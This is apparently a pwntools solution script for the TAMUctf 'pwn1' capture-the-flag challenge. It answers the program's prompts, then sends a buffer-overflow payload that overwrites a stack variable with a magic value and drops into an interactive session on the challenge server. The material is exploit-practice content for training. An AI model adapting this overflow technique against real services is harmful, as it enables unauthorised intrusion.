#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = remote('pwn.tamuctf.com', 4321)
elf = ELF('./pwn1')

io.sendlineafter('name?\n', 'Sir Lancelot of Camelot')
io.sendlineafter('quest?\n', 'To seek the Holy Grail.')
payload = 'a' * 0x2b + p32(0xDEA110C8)
io.sendlineafter('secret?\n', payload)
io.interactive()
io.close()

